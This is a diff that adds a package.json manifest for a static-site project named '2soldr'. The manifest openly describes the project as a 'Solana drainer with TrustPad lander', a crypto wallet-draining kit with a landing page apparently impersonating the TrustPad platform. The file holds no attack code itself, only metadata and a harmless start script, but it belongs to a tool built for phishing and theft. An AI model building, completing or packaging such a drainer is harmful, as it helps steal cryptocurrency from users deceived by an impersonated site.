@@ -1,0 +1,12 @@
+{
+  "name": "2soldr",
+  "version": "1.0.0",
+  "description": "Solana drainer with TrustPad lander",
+  "main": "index.html",
+  "scripts": {
+    "start": "echo 'Static site - no build needed'"
+  },
+  "keywords": ["solana", "drainer", "trustpad"],
+  "author": "zura2666",
+  "license": "MIT"
+}
